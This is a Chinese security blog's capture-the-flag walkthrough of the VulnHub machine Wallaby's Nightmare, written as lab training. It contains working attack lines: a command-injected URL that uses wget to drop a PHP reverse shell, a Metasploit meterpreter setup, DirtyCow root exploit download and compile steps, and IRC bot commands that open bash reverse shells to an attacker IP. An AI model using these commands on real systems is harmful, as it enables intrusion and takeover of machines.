> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wFHCE2A5vC2iIwtcXWn-aQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **38** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/jU2bISnUvibnZbnibN8FBQH5OCbpy2RiaqvN4CbAVLGxKnXwKvTYKNBgiavibFHfCtibdicicjjPjKXicZASnmAVicxkRlfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/

靶机难度：中级（CTF）

靶机发布日期：2016 年 12 月 22 日

靶机描述：

这是我的第一台 boot2root 机器。这是初学者的中级水平。

它已经在 VBox 和 VMware 中进行了测试，并且似乎都可以正常工作。

提示，任何东西都可以作为向量，实际上是根据机器的工作原理来思考问题。但是如果做错了动作，一些东西会四处走动，使机器更加困难！

这是两部分系列中的第一部分。我受到在 vulnhub 上发现的几台虚拟机的启发，给计算机增加了一些变化。

祝你好运，希望大家喜欢！

这是我有史以来的第一个 CTF / Vulnerable VM。我出于教育目的创建了它，因此人们可以在合法的渗透测试环境中测试他们的技能，从而获得一些乐趣。

下载前请注意一些事项！

尝试使用仅主机适配器。这是一台易受攻击的计算机，将其保留在网络上可能会导致不良后果。

它应该可以完美地与 Vmware 一起使用。我已经用 vbox 测试了它，并让另一个朋友也在 vbox 上测试了它，因此我认为它在其他任何东西上都应该可以正常工作。

这是一个 Boot2Root 机器。目的是让您尝试在 VM 中获得 root 特权。不要试图通过恢复 iso 等获取根标志，这本质上是作弊！这个想法是通过假装此机器正在通过没有物理访问权限的网络受到攻击来解决的。

我为这台机器设计了主题，以使其感觉更逼真。您正在闯入一个虚构的角色服务器（名为 Wallaby），并试图在没有引起他注意的情况下生根，否则，如果您采取错误的措施，难度将增加！祝你好运，希望大家喜欢！

Changelog v1.0-2016-12-22 - 首次发布。v1.0.1-2016-12-29 - 通过各种修复使 VM 变得更加困难。v1.0.2-2016-12-30 - 删除了可以用作快捷方式的剩余临时文件。--- 谷歌翻译

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/VJt1QibEWNRfO10Oo0PkHSmDL3qXfsGFDH88uPmn8CgjBFdpap6TpyH2RSslx4l1ZLlas24L9zibRj0RMyoXib4QA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/1DQLmy5KF5MaCtDZZia7mqCsAcicbdgic2icD5s2uXPqW36ByRogdicl1gU9ApjfhRj4xzFa9Qaw5Jib15lSvibvichcFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ic1JA7F5FW7EwUjZ7Y5D6HTV4J3TpDkT1CoB8KzlyiaGhUQicOMr2N8uU17P8r4QSA6k1znVmLzXaNdlicpXL7KJvA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1foBapYicts0GEYpuLsDPyK8icRSibRbnEnIE2ZRuONFibDibLxXhHGAZGcQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1V3qSWFYVYrxv4YUUqZxdBbwGaIEuaAenL0CwfVMa0SKib7a0rjDt4CQ/640?wx_fmt=png)我们已经找到了此次 CTF 目标计算机 IP 地址：

```
192.168.56.182.135
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC10HSWqWibMzlOqVvfmXyuatwk2mkZdO111AsHeSSXiaudZPqRNv6ftk9g/640?wx_fmt=png)

nmap 扫到了 22、80 和 6667 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1k2Fl6nmAZrXLj4ffjgUnDGxaJKicxfZ78nbqHKhPQV1lRpdNmbIeN6Q/640?wx_fmt=png)

让我输入用户名，开始此次 CTF！...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1Dsf1aZic6TsL1LwjLJSLFDC5bqr78gqVessFOwnEB308B5mN6RUYMbg/640?wx_fmt=png)

输入用户名 dayu... 点击 start 开启 CTF 之旅...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1NVKd7zmIDu5BNLiajco7Q8D8rD52NjQy1ZyrCyl1DibVPo0xdZ6icTPKQ/640?wx_fmt=png)

Wallaby 发现 dayu 试图侵入服务器内部... 因此 dayu 在它的监视下...

还发现 /?page = 这里存在 LFI 攻击... 试试看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1BPLkibEiczjbjwraFeqZJFXPgdRq6H0tlFQfOLMvICuYtQRwOdSxoKtA/640?wx_fmt=png)

先保留此信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC17L5hj2jWW7Eu3DvPpErVQFZupaib3ezvFYNbk5Y0Hz654S21w5PxdEg/640?wx_fmt=png)

我尝试访问../../../../../../../../../../etc/passwd 发现无法访问了...???

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1c0xe0H7uicjw1hr45jBSwBIsh6zUHQEfbeVYz5jibbomvqu2WE36SIfQ/640?wx_fmt=png)

我重新 nmap 扫发现 80 端口关闭了，看前面的对话意思，应该是 Wallaby 发现了我在渗透服务器，阻止了我...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1Fll2VqZwr0R5jSxGSoKuD20aAdwTlymU5usOyJXUZia49z06u6Mib8lg/640?wx_fmt=png)

发现 80 端口虽然关闭了，60080 端口开启了 http 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1UkXOv53icayxc589saSAavEedGlqdx87JZXJHlNycjnmAwAFnuR2YiaQ/640?wx_fmt=png)

我直接爆破枚举了 http:60080/?page = 页面... 发现 mailer...（别的链接也进去看了，目前没发现好用的信息...）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC15AD36w5ZU6bra4anbWqOJK2kJwEAROkPNDK9vPVOXQRgPFKn8vrtxw/640?wx_fmt=png)

我在前端源代码看到有用的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1mC2SeMbphvw59zqsg3s4mpibXO936Cj6KYialN70FAsL8UR7X9fQ7XCg/640?wx_fmt=png)

a href 标签包含了一个 url 信息.../?page=mailer&mail=mail...（这里存在 LFI）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1Y6BynXBWNarnctBt0eAUIpySbVVp2M0EAsJvhZfvBTOOst45V0BJoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/1DQLmy5KF5MaCtDZZia7mqCsAcicbdgic2icD5s2uXPqW36ByRogdicl1gU9ApjfhRj4xzFa9Qaw5Jib15lSvibvichcFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ic1JA7F5FW7EwUjZ7Y5D6HTV4J3TpDkT1CoB8KzlyiaGhUQicOMr2N8uU17P8r4QSA6k1znVmLzXaNdlicpXL7KJvA/640?wx_fmt=png)

二、提权

随意输入，输出 www-data... 直接利用即可...

加载 Metasploit 框架以通过反向连接与受害者进行连接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1TYyEI2h9deSzkicJ47XFxp44PiaJEYJEKOib4AHFJUiaPpLY4z20VQfEWw/640?wx_fmt=png)

```
use exploit/multi/script/web_delivery
set target 1
set payload php/meterpreter/reverse_tcp
set lhost 192.168.182.135
set lport 4444
run
```

这边通过 Metasploit 生成了 php 注释... 直接复制到 web 进行访问即可获得反向链接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC113OGcKpSBR6xkfibM2ghTJYwHL4bPg1doyQKibqwwauEc7VBCZT8tBRw/640?wx_fmt=png)

链接成功后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1yDWRFYaOLKyrib0LwoE046NEY18Xfug3iaun32HuU8oqveUP2P9Xnx9w/640?wx_fmt=png)

查看版本，可以利用脏牛进行提权...Dirty cow exploit （CVE-2016-5195）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1icTFqEZdWo4v2vyQ8YdpzGzvhAzfRgjnpcOhlI4C06ufj0vDlB0w0vA/640?wx_fmt=png)

直接下载到靶机服务器即可..

```
wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1Tn4FPPYdxx37Iq2bNEGUticqBwUK6I4jQZrsXN26zxmia5OgDFQyn0vw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1N9ibtsibrbj3W0WVWIeMGu3MzrouNwX0Rchq1GpuZEvPX08Ifcf3GicpQ/640?wx_fmt=png)

```
gcc cowroot.c -o dayu -pthread
```

用 gcc 进行编译...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1rxjEicn9bdx8Sf0oXcFwWEETLkVY2icWd4H0HlV4v46hVjvIPhExgbAg/640?wx_fmt=png)

执行并成功获得 root 权限，并查看 flag....

![](https://mmbiz.qpic.cn/mmbiz_png/1DQLmy5KF5MaCtDZZia7mqCsAcicbdgic2icD5s2uXPqW36ByRogdicl1gU9ApjfhRj4xzFa9Qaw5Jib15lSvibvichcFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ic1JA7F5FW7EwUjZ7Y5D6HTV4J3TpDkT1CoB8KzlyiaGhUQicOMr2N8uU17P8r4QSA6k1znVmLzXaNdlicpXL7KJvA/640?wx_fmt=png)

第二种提权方法

发现 LFI 漏洞利用后，我直接利用 python 代码，现在世面上很多 python 提权的代码... 例如：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1zO75F7MHXjrssCxKCZRMYJicHRhDHzibcejmN6icsWFQITj85EBA4EUIw/640?wx_fmt=png)

这两种都可以在这里提权，前面是代码直接复制到 web 链接即可，另外一个是 shell，wget 下载上去即可触发...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC166HOuibELdcW0R9gzGa7vLzibwTCjduBGpnNJ1qkffJhxwQYABBw3Kkg/640?wx_fmt=png)

直接获得了低权...（右下角是广告，忽略...）

直接提权 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1PcNicHFAOic7uy4hGNemBCibCoy87u4aUBySVZfq6IXC2Tj2A0DoTV40g/640?wx_fmt=png)

```
cp /usr/share/webshells/php/php-reverse-shell.php shelly.php
```

将 shell 放入本目录中  

```
python -m SimpleHTTPServer  (开启本地服务）
http://192.168.182.135:60080/index.php?page=mailer&mail=wget%20192.168.182.149:8000/shell.php; chmod 777 shell.php; ls -al   （在web中打开从服务中下载shell.php到靶机上）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC11syiabBQ8Npcc5dib8bWSzQQdmQqINNKBoBshJibkCOnHSz1YEcdzsCsQ/640?wx_fmt=png)

开启本地监听..web 访问下即可提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1BqVhWUZrMY2FVzYGvdtofIFfK9rZNJRMbz5kWUa1HG54VgbdzqHu9A/640?wx_fmt=png)

ALL 可以执行 iptables，运行前面 nmap 扫到的 6667 端口的 IRC 服务器...（未开启的）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1MkicKr9fYyjOzNQicBoenfL34xrMVMg6KQyzicormx7EAqgORHAlYiaLIg/640?wx_fmt=png)

继续查看 iptables 规则... 当前的规则是所有与 IRC 的外部连接都将被删除... 准备使 IRC 服务器进行开放...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1oxniaATCrTafLbbAibqceyhaibzuaMxUIXic1ZZiclHbia5jBa5dAAQpGJpg/640?wx_fmt=png)

```
sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT（重写了第二条规则以允许端口6667上的TCP连接）
```

运行完后，nmap 前面扫描未开启 6667 端口，在重新扫描后，开启了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1ZB5H7vPDyicPGbqLwxLy0ibqTZUy33ic5Mf8tSsmfmLosYD14hibLV33tA/640?wx_fmt=png)

这边需要加入频道才可以进入其中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1yxfnlicxtGzicsFUZYeRaXLMS2o12PvJhjG1iasUHX9Pkf759ExN2mzlw/640?wx_fmt=png)

```
cat raw.log | grep "#"
```

在 / home/wallaby/.sopel/logs/raw.log 文件中发现了 wallabyschat 频道...

这边可以使用两种工具链接进 IRS 服务器中...irssi 和 HexChat...

![](https://mmbiz.qpic.cn/mmbiz_png/1DQLmy5KF5MaCtDZZia7mqCsAcicbdgic2icD5s2uXPqW36ByRogdicl1gU9ApjfhRj4xzFa9Qaw5Jib15lSvibvichcFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ic1JA7F5FW7EwUjZ7Y5D6HTV4J3TpDkT1CoB8KzlyiaGhUQicOMr2N8uU17P8r4QSA6k1znVmLzXaNdlicpXL7KJvA/640?wx_fmt=png)

IRSSI

```
我这边使用irssi：[链接](https://www.cnblogs.com/tsdxdx/p/7291877.html)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1pI6XQssYUEWxZBuLQOjJeRuTejzKIsXAZDHrZOnMpU6n74ATc2uibZA/640?wx_fmt=png)

```
irssi -c [server] -p [port] -n [nickname]
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC189MKKEMWctQh2v860jYlX1HhAxhS2uuavsQ7yfrqGOTSXC019Cy6qw/640?wx_fmt=png)

```
1. /list
 2. /j wallabyschat
```

在通道 wallabyschat 内，我看到了另外两个用户...

/wc（退出当前频道）回到 irssi 主窗口，进行一些信息收集看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC17db8eVLesZVaxdKZJXFnmZ4PcBcquokyrpUIaNa2m6JN48ibMZQQiaxw/640?wx_fmt=png)

```
3. /whois waldo
 4. /whois wallabysbot
```

可以看到 wallabysbot 是基于 Sopel 的... 在服务器上寻找下 bot 框架...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1hxrK9LvYib2UC2FlQugyFOib1bd5aDD7HekAqtoiavYBQDNkxeEuOCF4A/640?wx_fmt=png)

Sopel 在 Wallabys 的主文件夹中找到，只有一个模块可用，这是一个典型的运行脚本 run.py...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1ibtUNz6oVq71zibSglDOVgxomFhFWrXL9L0zrfV0mRnmHpDHrXhB3GSA/640?wx_fmt=png)

脚本表明只能 Waldo 才能运行此脚本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1k3Xa2pnyhIz1ZcSJPphr2YCGVQN0icI0I9ibNfT4H6sk39Ncxn2130cw/640?wx_fmt=png)

在 IRSSI 中执行此结果失败了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1pzsebVn2ibMia4dEyEAVmicbibNUH5uvicKYZBeIjORJrhicy9VGYBIJFORw/640?wx_fmt=png)

在 waldos 主文件夹中找到了一个名为 irssi.sh 的脚本... 发现个问题...

发现 Waldo 正在使用 tmux 满足 IRC 需求... 如果服务装置出现故障... 就是说 tmux 掉线了，IRC 也会跟着掉线...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1CZkgjzX2vJrbA9a3HLKCs8mxTwWI8Piamk58sl6bZ4BB49uHQwrL9kQ/640?wx_fmt=png)

上面是 Tmux 进程 ID...

```
python -c 'import pty;pty.spawn("/bin/bash")
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1UBkxvbkBkFlGicpDIeeM6NoDXX9TzOtoWYibFQibMFwiaxIo4gGc0sluYg/640?wx_fmt=png)

```
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

使用 Vim 发出 kill 命令 [ESC]:!kill 817 [ENTER]...  （ps -aux | grep waldo 来查看进程 ID）

Waldos IRC 连接中断后.../nick waldo 更改名称... 然后使用. run 获取反向 shell 即可...

```
.run bash -c 'bash -i >& /dev/tcp/192.168.182.149/8989 0>&1'
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1qyibqgg43TRLY9Rrwa391PJ9W2ek9EiczicK7bsiajlSV6JpBsr2NCs5qQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/1DQLmy5KF5MaCtDZZia7mqCsAcicbdgic2icD5s2uXPqW36ByRogdicl1gU9ApjfhRj4xzFa9Qaw5Jib15lSvibvichcFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ic1JA7F5FW7EwUjZ7Y5D6HTV4J3TpDkT1CoB8KzlyiaGhUQicOMr2N8uU17P8r4QSA6k1znVmLzXaNdlicpXL7KJvA/640?wx_fmt=png)

HexChat

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1PIr5ZcLtNP2FPCcian49sNEJNYRrj5z1aK5EAyBoPQNDgMa6tkCrjbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1yiaia1Ep46p8D8PFq02znGSq0vg2LktI3G9AtTnBTtkMYc8mibjFC1TPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1rbxdQPrbKtOVPszucV9eXJRyu30etUnAEBNeTFeDJMwRKITUD4BnYQ/640?wx_fmt=png)

```
以上是基础配置....[链接](https://tieba.baidu.com/p/5270992068?red_tag=2887250276)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1QWqq2ibSoATnhwQcqkCAa1ZTumJcCN4rYwJ2lcyAfVQpPbYqCKVtdLQ/640?wx_fmt=png)

已经进来了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1hr79wGZYuCA0WsnmNlrRfQ6o0Q08vniaCbMzSiaGTicxrl3YYu7Zibjjzg/640?wx_fmt=png)

```
ps -aux | grep waldo  （查看进程）
```

irssi 进程的数量 684，可以使用 vim 杀死该进程...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1qia1NWSCwrqeBrD4SLZXbWYt18R2IK4SAMvZJGfKLuNF2JOxfKVbo5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1gUTSMO9YRLGMvMtAXOapjANSqdDQDcLQ4asJldPiaFGypxicy9kndeWQ/640?wx_fmt=png)

已经成功干掉该进程...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC10rrcfibfDVMrakSvfDZYxq28Vbp1ibjBSqSeNM2BRpRSfCcMSYkh9icUA/640?wx_fmt=png)

```
1. waldo has quit (Client exited)
 2. You are now known as waldo
 3. .run whoami
```

使用 / nick waldo 命令将其名称快速更改为它的名字，并执行. run 命令...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC1L1GrOAEt7dmZskiavE98lSEQ1hia7ia2hxcHNQYW32cMdO7AVjnrWKgag/640?wx_fmt=png)

```
.run bash -c "bash -i >& /dev/tcp/192.168.182.149/6666 0>&1"  （前面就已经分析过了run可以执行...）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPoB7sLaian1KXic16rcTqJC16Igc3ibqCSnxyh1q3fpUd9WYSx2ObVcZ5bGNwLswCFtadpcQmFib1HRQ/640?wx_fmt=png)

```
开启nc服务后，获得wallaby用户权限，sudo提权即可...HexChat命令：[链接](https://sopel.chat/usage/commands/)
```

这台靶机很舒服，用了 Metasploit、php、python、DirtyCow、IRSSI、HexChat 来拿下这台靶机... 学到非常非常非常多的知识，感谢这台靶机的作者！！！

写完这篇又不知不觉到了凌晨 2 点... 我写得目的就是让我自己记得更深，更加理解一些原理... 加油！！

由于我们已经成功得到 root 权限和 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/eYQPCtdp52LibNkiaf6uEFlNLBXkYNLkGrreELUwooJCbCCre3PNVwyB7MD0We5GB7C1iao7ZNneayc3PxQD0iaAmg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)